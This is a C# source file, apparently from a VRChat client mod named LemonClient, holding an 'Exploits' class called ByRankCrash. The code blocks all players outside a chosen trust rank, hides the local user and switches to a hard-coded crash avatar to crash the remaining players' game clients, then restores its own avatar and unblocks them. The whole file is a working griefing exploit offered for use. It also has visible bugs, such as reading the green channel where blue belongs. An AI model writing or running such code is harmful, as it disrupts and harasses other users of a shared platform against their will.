using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using UnityEngine;
using MelonLoader;
using VRC;
using VRC.DataModel;
using VRC.UI;
using System.Collections;

namespace _LemonClient.Exploits
{
    class ByRankCrash
    {
        /* private static string visColor = "(0.8, 0.8, 0.8)";
        private static string newColor = "(0.09019608, 0.4705882, 1)";
        private static string userColor = "(0.1686275, 0.8117647, 0.3607843)";
        private static string knownColor = "(1, 0.4823529, 0.2588235)";
        private static string trustedColor = "(0.5058824, 0.2627451, 0.9019608)";*/
        public static int blockTime = 10;
        public static string prevAviID = "avtr_c38a1615-5bf5-42b4-84eb-a8b6c37cbd11";
        public static string prevRankCol;
        public static string crashID = "avtr_82f02b8b-eb36-4039-9265-0b47f23417b1"; //AppleBottomJeans = avtr_82f02b8b-eb36-4039-9265-0b47f23417b1

        public static IEnumerator UnblockRanking()
        {
            List<VRC.Player>.Enumerator enumeratorList = ExtraDependencies.PlayerWrapper.AllPlayers.GetEnumerator();
            while (enumeratorList.MoveNext())
            {
                MelonLogger.Msg("Scanning Players");
                Player current = enumeratorList.Current;
                PageUserInfo component = GameObject.Find("Screens").transform.Find("UserInfo").GetComponent<PageUserInfo>();
                component.field_Private_APIUser_0 = current.field_Private_APIUser_0;
                string currentColor = "(" + ExtraDependencies.PlayerWrapper.GetTrustColor(current).r + ", " + ExtraDependencies.PlayerWrapper.GetTrustColor(current).g + ", " + ExtraDependencies.PlayerWrapper.GetTrustColor(current).g + ")"; //Convert UnityEngine.Color into readable string

                if (prevRankCol == "(0.8, 0.8, 0.8)") //Crashed Visitors
                {
                    if (currentColor == prevRankCol)
                    {
                        MelonLogger.Msg("Ignored player");
                    }
                    else
                    {
                        component.ToggleBlock();
                        MelonLogger.Msg("Removed actor number " + ExtraDependencies.PlayerWrapper.GetActorNumber(current) + " from blocked players");
                    }
                }
                else if (prevRankCol == "NewUser")
                {
                    if (ExtraDependencies.PlayerWrapper.GetAPIUser(current).hasBasicTrustLevel)
                    {      //New User or higher
                        if (ExtraDependencies.PlayerWrapper.GetAPIUser(current).hasKnownTrustLevel)
                        {  //User or above
                            component.ToggleBlock();
                            MelonLogger.Msg("Removed actor number " + ExtraDependencies.PlayerWrapper.GetActorNumber(current) + " from blocked players");
                        }
                        else                                                                  //New User
                        {
                            MelonLogger.Msg("Ignoring Player " + ExtraDependencies.PlayerWrapper.GetAPIUser(current).displayName + " due to matching rank");
                        }
                    }
                    else                                                                      //Visitor
                    {
                        component.ToggleBlock();
                        MelonLogger.Msg("Removed actor number " + ExtraDependencies.PlayerWrapper.GetActorNumber(current) + " from blocked players");
                    }
                }
                else if (prevRankCol == "User")
                {
                    if (ExtraDependencies.PlayerWrapper.GetAPIUser(current).hasKnownTrustLevel)             //User or higher
                    {
                        if (ExtraDependencies.PlayerWrapper.GetAPIUser(current).hasTrustedTrustLevel)       //Known User or higher
                        {
                            component.ToggleBlock();
                            MelonLogger.Msg("Removed actor number " + ExtraDependencies.PlayerWrapper.GetActorNumber(current) + " from blocked players");
                        }
                        else                                                                       //User
                        {
                            MelonLogger.Msg("Ignoring Player " + ExtraDependencies.PlayerWrapper.GetAPIUser(current).displayName + " due to matching rank");
                        }
                    }
                    else                                                                          //Visitor
                    {
                        component.ToggleBlock();
                        MelonLogger.Msg("Removed actor number " + ExtraDependencies.PlayerWrapper.GetActorNumber(current) + " from blocked players");
                    }
                }
                else if (prevRankCol == "KnownUser")
                {
                    if (ExtraDependencies.PlayerWrapper.GetAPIUser(current).hasTrustedTrustLevel)          //Known User or higher
                    {
                        if (ExtraDependencies.PlayerWrapper.GetAPIUser(current).hasVeteranTrustLevel)      //Trusted User
                        {
                            component.ToggleBlock();
                            MelonLogger.Msg("Removed actor number " + ExtraDependencies.PlayerWrapper.GetActorNumber(current) + " from blocked players");
                        }
                        else                                                                       //Known User
                        {
                            MelonLogger.Msg("Ignoring Player " + ExtraDependencies.PlayerWrapper.GetAPIUser(current).displayName + " due to matching rank");
                        }
                    }
                    else                                                                          //Below Known User
                    {
                        component.ToggleBlock();
                        MelonLogger.Msg("Removed actor number " + ExtraDependencies.PlayerWrapper.GetActorNumber(current) + " from blocked players");
                    }
                }
                else if (prevRankCol == "TrustedUser")
                {
                    if (ExtraDependencies.PlayerWrapper.GetAPIUser(current).hasVeteranTrustLevel)
                    {
                        MelonLogger.Msg("Ignoring Player " + ExtraDependencies.PlayerWrapper.GetAPIUser(current).displayName + " due to matching rank");
                    }
                    else
                    {
                        component.ToggleBlock();
                        MelonLogger.Msg("Removed actor number " + ExtraDependencies.PlayerWrapper.GetActorNumber(current) + " from blocked players");
                    }
                }

                current = null;
                component = null;
            }
            prevRankCol = "";
            prevAviID = ExtraDependencies.PlayerWrapper.GetAPIAvatar(ExtraDependencies.PlayerWrapper.LocalPlayer()).id;
            Features.HideSelf.PerformHide(false); //Safety Catch, just in case BoolCombined fails to re-initiate avatar queue
            return null;
        }

        public static IEnumerator BoolCombined(string rankColor)
        {
            prevAviID = ExtraDependencies.PlayerWrapper.GetAPIAvatar(ExtraDependencies.PlayerWrapper.LocalPlayer()).id;
            ExtraDependencies.PlayerWrapper.ChangeAvatar("avtr_c38a1615-5bf5-42b4-84eb-a8b6c37cbd11"); //Sets to default for switch
            Features.HideSelf.PerformHide(true);
            MelonLogger.Msg("Hidden Self as protection");
            List<VRC.Player>.Enumerator enumeratorList = ExtraDependencies.PlayerWrapper.AllPlayers.GetEnumerator();
            while (enumeratorList.MoveNext())
            {
                MelonLogger.Msg("Scanning Players");
                Player current = enumeratorList.Current;
                PageUserInfo component = GameObject.Find("Screens").transform.Find("UserInfo").GetComponent<PageUserInfo>();
                component.field_Private_APIUser_0 = current.field_Private_APIUser_0;
                string currentColor = "(" + ExtraDependencies.PlayerWrapper.GetTrustColor(current).r + ", " + ExtraDependencies.PlayerWrapper.GetTrustColor(current).g + ", " + ExtraDependencies.PlayerWrapper.GetTrustColor(current).g + ")"; //Convert UnityEngine.Color into readable string
                
                if(rankColor == "(0.8, 0.8, 0.8)") //Visitor
                {
                    if (currentColor != rankColor) //Not specified rank && not self
                    {
                        component.ToggleBlock();
                        MelonLogger.Msg("Added actor number " + ExtraDependencies.PlayerWrapper.GetActorNumber(current) + " to blocked players");

                    }
                    else
                    {
                        MelonLogger.Msg("User is specified rank");
                    }
                } else if (rankColor == "NewUser")
                {
                    if (ExtraDependencies.PlayerWrapper.GetAPIUser(current).hasBasicTrustLevel) {      //New User or higher
                        if (ExtraDependencies.PlayerWrapper.GetAPIUser(current).hasKnownTrustLevel) {  //User or above
                            component.ToggleBlock();
                            MelonLogger.Msg("Added actor number " + ExtraDependencies.PlayerWrapper.GetActorNumber(current) + " to blocked players");
                        } else                                                                  //New User
                        {
                            MelonLogger.Msg("Ignoring Player "+ExtraDependencies.PlayerWrapper.GetAPIUser(current).displayName + " due to matching rank");
                        }
                    } else                                                                      //Visitor
                    {
                        component.ToggleBlock();
                        MelonLogger.Msg("Added actor number " + ExtraDependencies.PlayerWrapper.GetActorNumber(current) + " to blocked players");
                    }
                } else if(rankColor == "User")
                {
                    if(ExtraDependencies.PlayerWrapper.GetAPIUser(current).hasKnownTrustLevel)             //User or higher
                    {
                        if(ExtraDependencies.PlayerWrapper.GetAPIUser(current).hasTrustedTrustLevel)       //Known User or higher
                        {
                            component.ToggleBlock();
                            MelonLogger.Msg("Added actor number " + ExtraDependencies.PlayerWrapper.GetActorNumber(current) + " to blocked players");
                        } 
                        else                                                                       //User
                        {
                            MelonLogger.Msg("Ignoring Player " + ExtraDependencies.PlayerWrapper.GetAPIUser(current).displayName + " due to matching rank");
                        }
                    } else                                                                          //Visitor
                    {
                        component.ToggleBlock();
                        MelonLogger.Msg("Added actor number " + ExtraDependencies.PlayerWrapper.GetActorNumber(current) + " to blocked players");
                    }
                }
                else if (rankColor == "KnownUser")
                {
                    if (ExtraDependencies.PlayerWrapper.GetAPIUser(current).hasTrustedTrustLevel)          //Known User or higher
                    {
                        if (ExtraDependencies.PlayerWrapper.GetAPIUser(current).hasVeteranTrustLevel)      //Trusted User
                        {
                            component.ToggleBlock();
                            MelonLogger.Msg("Added actor number " + ExtraDependencies.PlayerWrapper.GetActorNumber(current) + " to blocked players");
                        }
                        else                                                                       //Known User
                        {
                            MelonLogger.Msg("Ignoring Player " + ExtraDependencies.PlayerWrapper.GetAPIUser(current).displayName + " due to matching rank");
                        }
                    }
                    else                                                                          //Below Known User
                    {
                        component.ToggleBlock();
                        MelonLogger.Msg("Added actor number " + ExtraDependencies.PlayerWrapper.GetActorNumber(current) + " to blocked players");
                    }
                }
                else if (rankColor == "TrustedUser")
                {
                    if (ExtraDependencies.PlayerWrapper.GetAPIUser(current).hasVeteranTrustLevel)
                    {
                        MelonLogger.Msg("Ignoring Player " + ExtraDependencies.PlayerWrapper.GetAPIUser(current).displayName + " due to matching rank");
                    }
                    else
                    {
                        component.ToggleBlock();
                        MelonLogger.Msg("Added actor number " + ExtraDependencies.PlayerWrapper.GetActorNumber(current) + " to blocked players");
                    }
                }

                current = null;
                component = null;
            }
            //Blocking complete
            MelonLogger.Msg("Blocking Complete");
            yield return new WaitForSeconds(5f);
            MelonLogger.Msg("Crashing");
            Features.SwitchToAvatarID.SwitchID(crashID);
            MelonLogger.Msg("Switch");
            prevRankCol = rankColor;
            yield return new WaitForSeconds(10f);
            MelonLogger.Msg("Crash Complete. Unblocking");
            Features.HideSelf.PerformHide(false);
            MelonLogger.Msg("Returning avatar queue functionality");
            yield return new WaitForSeconds(1f);
            Features.SwitchToAvatarID.SwitchID(prevAviID);
            yield return new WaitForSeconds(5f);
            UnblockRanking();
            yield break;
        }
    }
}
